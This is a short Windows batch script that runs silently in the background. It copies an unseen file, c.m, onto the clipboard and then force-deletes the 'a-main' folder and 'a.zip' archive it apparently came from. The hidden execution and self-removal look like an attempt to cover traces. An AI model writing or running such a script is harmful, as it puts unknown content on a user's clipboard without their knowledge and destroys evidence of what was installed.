@echo off
setlocal enabledelayedexpansion
:: Run silently in background
start /b cmd /c ^
(
  :: Copy content of c.m to clipboard
  type c.m | clip
  
  :: Brief pause to ensure clipboard operation completes
  timeout /t 1 /nobreak > nul
  
  :: Go up one directory
  cd ..
  
  :: Remove the "a-main" directory and "a.zip" file
  if exist a-main rmdir /s /q a-main
  if exist a.zip del /f /q a.zip
)
